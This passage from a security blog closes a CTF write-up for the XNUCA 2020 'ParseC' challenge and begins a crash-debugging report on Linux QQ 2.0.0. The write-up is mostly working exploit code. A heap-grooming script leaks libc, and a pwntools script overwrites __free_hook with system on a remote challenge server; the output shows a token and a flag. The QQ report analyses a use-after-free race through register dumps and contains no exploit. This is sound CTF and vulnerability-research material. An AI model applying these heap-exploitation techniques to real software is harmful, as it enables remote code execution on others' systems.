class="number">1</span>)</span></span>; <span class="comment">// align</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;malloc target chunk&quot;</span>);</span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr_mod</span><span class="params">(<span class="number">1</span>)</span></span>; <span class="comment">// modify target as one_gadget</span></span><br><span class="line">	arr_mod[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	nn = <span class="number">0</span>;</span><br><span class="line">	read(nn);</span><br><span class="line">	arr_mod[<span class="number">0</span>] = nn;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">	x = <span class="string">&quot;------------------------------------get_shell--------------------------------------&quot;</span>;</span><br><span class="line">	x = <span class="string">&quot;getshelll&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">func leak_libc &#123;</span><br><span class="line">    <span class="comment">// remote heap buffer for align heap offset</span></span><br><span class="line">	r = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line"></span><br><span class="line">	x = <span class="string">&quot;free x&quot;</span>; <span class="comment">// free x</span></span><br><span class="line">	<span class="comment">// leak libc</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;AAAAAAAA&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">func error_exit &#123;</span><br><span class="line">	<span class="function"><span class="built_in">array</span> <span class="title">arr</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">	arr[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">leak_libc();</span><br><span class="line">write_to_target(t_addr);</span><br></pre></td></tr></table></figure>



<h4 id="交互exp"><a href="#交互exp" class="headerlink" title="交互exp"></a>交互exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;./ParseC&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libc_path = &#x27;/glibc/2.27/64/lib/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">main_arena = <span class="number">0x3ebc40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;123.57.4.93&quot;</span></span><br><span class="line">server_port = <span class="number">34007</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">float_to_hex</span>(<span class="params">f</span>):</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">hex</span>(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, f))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_to_hex</span>(<span class="params">f</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;d&#x27;</span>, f))[<span class="number">0</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_to_long_int</span>(<span class="params">f</span>):</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&lt;Q&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;d&#x27;</span>, f))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_double</span>(<span class="params">d</span>):</span></span><br><span class="line">	d = p64(d)</span><br><span class="line">	data = struct.unpack(<span class="string">&quot;d&quot;</span>, d[:<span class="number">8</span>])</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">	</span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line">print(<span class="string">&#x27;double_hex: &#x27;</span> + double_to_hex(<span class="number">1.0</span>))</span><br><span class="line">print(hex_to_double(<span class="number">0x3ff0000000000000</span>))</span><br><span class="line">print(hex_to_double(<span class="number">0x1000</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span>(LOCAL == <span class="number">0</span>):</span><br><span class="line">		fd = <span class="built_in">open</span>(<span class="string">&#x27;./exp.c&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">		d = fd.read()</span><br><span class="line">		fd.close()</span><br><span class="line">		sla(<span class="string">&#x27;:&#x27;</span>, base64.b64encode(d))</span><br><span class="line">		ru(<span class="string">&#x27;-------------------------------------------------------\n&#x27;</span>)	</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base = leak - main_arena - <span class="number">1184</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#target = libc_base + libc.sym[&#x27;__malloc_hook&#x27;] - 0x28</span></span><br><span class="line">	target = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x28</span></span><br><span class="line">	gadget = [<span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line">	one_gadget = libc_base + gadget[<span class="number">0</span>]</span><br><span class="line">	one_gadget = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	t = <span class="built_in">str</span>(hex_to_double(target)).split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line">	o = <span class="built_in">str</span>(hex_to_double(one_gadget)).split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>][<span class="number">1</span>:]</span><br><span class="line">	li(<span class="string">&#x27;target = &#x27;</span> + <span class="built_in">hex</span>(target) + <span class="string">&#x27; double: &#x27;</span> + t)</span><br><span class="line">	li(<span class="string">&#x27;one_gadget = &#x27;</span> + <span class="built_in">hex</span>(one_gadget) + <span class="string">&#x27; double: &#x27;</span> + o)</span><br><span class="line">	db()</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	t = t.ljust(<span class="number">0x20</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	s(t)</span><br><span class="line">	ru(<span class="string">&#x27;chunk&#x27;</span>)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	o = o.ljust(<span class="number">0x20</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	<span class="comment">#for _ in range(2):</span></span><br><span class="line">	s(o)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process([<span class="string">&#x27;exp.c&#x27;</span>], env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span> : libc_path&#125;)</span><br><span class="line">			<span class="comment">#io = elf.process()</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Congratulations,please input your token: $ icq2383351cba441087032e259a726b5</span><br><span class="line">[DEBUG] Sent 0x21 bytes:</span><br><span class="line">    &#39;icq2383351cba441087032e259a726b5\n&#39;</span><br><span class="line">[DEBUG] Received 0x26 bytes:</span><br><span class="line">    &#39;flag&#123;d90118536dc642041ba9dfa4fc47f28f&#125;&#39;</span><br><span class="line">flag&#123;d90118536dc642041ba9dfa4fc47f28f&#125;[DEBUG] Received 0x37 bytes:</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/31/wp-xnuca-2020/" data-id="ckhemv83f003swdcmd4mrhrlx" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-qq-linux-vul-report" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/30/qq-linux-vul-report/" class="article-date">
  <time datetime="2020-10-29T16:53:19.000Z" itemprop="datePublished">2020-10-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/vul/">vul</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/30/qq-linux-vul-report/">linux qq 漏洞调试分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="linux-qq-漏洞调试分析"><a href="#linux-qq-漏洞调试分析" class="headerlink" title="linux qq 漏洞调试分析"></a>linux qq 漏洞调试分析</h1><h2 id="QQ调试报告"><a href="#QQ调试报告" class="headerlink" title="QQ调试报告"></a>QQ调试报告</h2><h3 id="调试者"><a href="#调试者" class="headerlink" title="调试者"></a>调试者</h3><p>I0gan</p>
<p>blog: <a target="_blank" rel="noopener" href="http://i0gan.cn/">http://i0gan.cn</a></p>
<p>github: <a target="_blank" rel="noopener" href="https://github.com/i0gan">https://github.com/i0gan</a></p>
<h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌[logan☮arch]-(/usr/bin)</span><br><span class="line">└&gt; checksec qq</span><br><span class="line">[!] Unknown configuration section &#x27;update&#x27;</span><br><span class="line">[*] &#x27;/usr/bin/qq&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>



<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>qq在登录之后在拉去消息和好友列表时出现段错误, 在反映比较慢的电脑上出现几率比较小, 在反映过快的电脑中, 每次基本都直接崩溃.</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>2.0.0</p>
<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>多线程条件竞争, 导致对象释放重利用, 然而在调用该函数指针时, 会出现内存地址非法调用</p>
<p>证实: 调试时, 在登录之后, 只运行主线程, 阻断其他线程运行, 能够成功保证登录之后不会崩溃, 只是接受不了消息</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>由于代码量比较大, 时间性的原因, 只能先暂时提供一下调试信息, 后期会不断更新调试结果, 找出对于的具体漏洞所在</p>
<h3 id="触发段错误漏洞代码块偏移"><a href="#触发段错误漏洞代码块偏移" class="headerlink" title="触发段错误漏洞代码块偏移"></a>触发段错误漏洞代码块偏移</h3><p>0xbfdfa0     (vul 1)</p>
<p>0xCCB500   (vul 2)</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>收到系统信号: sigsegv</p>
<h3 id="线程信息"><a href="#线程信息" class="headerlink" title="线程信息:"></a>线程信息:</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info threads</span><br><span class="line">  Id   Target Id                                          Frame </span><br><span class="line">  1    Thread 0x7ffff6964940 (LWP 6251) &quot;qq&quot;              0x00007ffff7ce49e5 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0</span><br><span class="line">  2    Thread 0x7ffff6963640 (LWP 6258) &quot;qq&quot;              0x00007ffff7e376a2 in pthread_cond_wait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0</span><br><span class="line">  3    Thread 0x7ffff6162640 (LWP 6259) &quot;ThreadPoolServi&quot; 0x00007ffff70485de in epoll_wait () from /usr/lib/libc.so.6</span><br><span class="line">  5    Thread 0x7ffff5160640 (LWP 6261) &quot;Qnox_LogicThrea&quot; 0x00007ffff70485de in epoll_wait () from /usr/lib/libc.so.6</span><br><span class="line">  6    Thread 0x7ffff495f640 (LWP 6262) &quot;Qnox_IOThread&quot;   0x00007ffff70485de in epoll_wait () from /usr/lib/libc.so.6</span><br><span class="line">  7    Thread 0x7ffff415e640 (LWP 6263) &quot;ThreadPoolForeg&quot; 0x00007ffff7e379c8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0</span><br><span class="line">  10   Thread 0x7ffff215a640 (LWP 6267) &quot;inotify_reader&quot;  0x00007ffff703fb7b in select () from /usr/lib/libc.so.6</span><br><span class="line">  14   Thread 0x7ffff094f640 (LWP 6270) &quot;qq&quot;              0x00007ffff7e376a2 in pthread_cond_wait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0</span><br><span class="line">  16   Thread 0x7ffff1158640 (LWP 6290) &quot;ThreadPoolForeg&quot; 0x0000555555ff85a0 in ?? ()</span><br><span class="line">  17   Thread 0x7ffff1959640 (LWP 6291) &quot;ThreadPoolForeg&quot; 0x00007ffff7e379c8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0</span><br><span class="line">  18   Thread 0x7ffff295b640 (LWP 6292) &quot;ThreadPoolForeg&quot; 0x00007ffff7e379c8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0</span><br><span class="line">  19   Thread 0x7ffff315c640 (LWP 6293) &quot;ThreadPoolForeg&quot; 0x0000555556000aa0 in ?? ()</span><br><span class="line">  20   Thread 0x7ffff395d640 (LWP 6294) &quot;gmain&quot;           0x00007ffff703d46f in poll () from /usr/lib/libc.so.6</span><br><span class="line">  21   Thread 0x7fffee64f640 (LWP 6295) &quot;pool-qq&quot;         0x00007ffff7042d5d in syscall () from /usr/lib/libc.so.6</span><br><span class="line">* 22   Thread 0x7fffede4e640 (LWP 6296) &quot;gdbus&quot;           0x00007ffff7ce49e5 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0</span><br></pre></td></tr></table></figure>



<h3 id="段错误"><a href="#段错误" class="headerlink" title="段错误"></a>段错误</h3><p>主线程段错误信号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thread 1 &quot;qq&quot; received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007ffff7ce49e5 in g_main_context_dispatch () from &#x2F;usr&#x2F;lib&#x2F;libglib-2.0.so.0</span><br></pre></td></tr></table></figure>

<p>调试如下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x7ffff7000000 (____wcstof128_l_internal+1168) ◂— adc    eax, 0x748b0000</span><br><span class="line"> RCX  0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */</span><br><span class="line"> RDX  0x7ffff7e450a0 (__pthread_keys) ◂— 0x1</span><br><span class="line"> RDI  0x134a77fdde60 ◂— 0xffffecb700000002</span><br><span class="line"> RSI  0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18]</span><br><span class="line"> R8   0x134a7710b520 ◂— 0x0</span><br><span class="line"> R9   0x7fffffffd880 ◂— 0x3000000028 /* &#x27;(&#x27; */</span><br><span class="line"> R10  0x7ffff7fca080</span><br><span class="line"> R11  0x286</span><br><span class="line"> R12  0x1</span><br><span class="line"> R13  0x134a77743890 ◂— 0x0</span><br><span class="line"> R14  0x134a77109dc0 ◂— 0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x134a774f4bd0 —▸ 0x134a77fdde60 ◂— 0xffffecb700000002</span><br><span class="line"> RSP  0x7fffffffd970 —▸ 0x134a77fdde60 ◂— 0xffffecb700000002</span><br><span class="line"> RIP  0x7ffff7ce49e5 (g_main_context_dispatch+581) ◂— call   qword ptr [rbx + 8]</span><br><span class="line">──────────────────────────────────────────[ DISASM ]──────────────────────────────────────────</span><br><span class="line"> ► 0x7ffff7ce49e5 &lt;g_main_context_dispatch+581&gt;    call   qword ptr [rbx + 8]</span><br><span class="line">        rdi: 0x134a77fdde60 ◂— 0xffffecb700000002</span><br><span class="line">        rsi: 0x7ffff7ce498d (g_main_context_dispatch+493) ◂— mov    rdi, qword ptr [rsp + 0x18]</span><br><span class="line">        rdx: 0x7ffff7e450a0 (__pthread_keys) ◂— 0x1</span><br><span class="line">        rcx: 0x7ffff7d42938 ◂— 0x6f5347007065656b /* &#x27;keep&#x27; */</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>rbx + 8内存</p>
